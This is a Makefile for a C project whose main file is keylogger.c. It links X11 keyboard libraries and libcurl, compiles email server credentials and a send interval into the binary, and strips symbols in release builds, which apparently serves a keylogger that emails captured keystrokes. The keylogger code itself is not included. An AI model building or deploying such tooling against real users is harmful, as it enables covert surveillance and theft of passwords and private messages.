CC = gcc
CFLAGS = -g -Wall
CPPFLAGS = -DEMAIL_USERNAME='"$(EMAIL_USERNAME)"' \
		   -DEMAIL_PASSWORD='"$(EMAIL_PASSWORD)"' \
		   -DEMAIL_PORT=$(EMAIL_PORT) \
		   -DEMAIL_SERVER='"$(EMAIL_SERVER)"' \
		   -DDURATION=$(DURATION)
LIBS = -lcurl -lxkbcommon -lxkbcommon-x11 -lX11 -lX11-xcb

SRC_DIR = src
OBJ_DIR = obj
BIN_DIR = ..
TARGET = $(BIN_DIR)/client.out

MAIN = keylogger.c
SRC = $(filter-out $(SRC_DIR)/$(MAIN), $(wildcard $(SRC_DIR)/*.c))
OBJ = $(patsubst $(SRC_DIR)/%.c, $(OBJ_DIR)/%.o, $(SRC))
DEBUG_CFLAGS = -g -O0 -DDEBUG
RELEASE_CFLAGS = -O2 -DNDEBUG -s


.PHONY: all clean release debug
all: release

debug: CFLAGS += $(DEBUG_CFLAGS)
debug: $(TARGET)

release: CFLAGS += $(RELEASE_CFLAGS)
release: $(TARGET)


$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c $(SRC_DIR)/%.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@

$(TARGET): $(SRC_DIR)/$(MAIN) $(OBJ)
	$(CC) $(CFLAGS) $(CPPFLAGS) $^ -o $(TARGET) $(LIBS)

$(OBJ_DIR):
	mkdir -p $@

clean:
	rm -rf $(TARGET) $(OBJ_DIR)
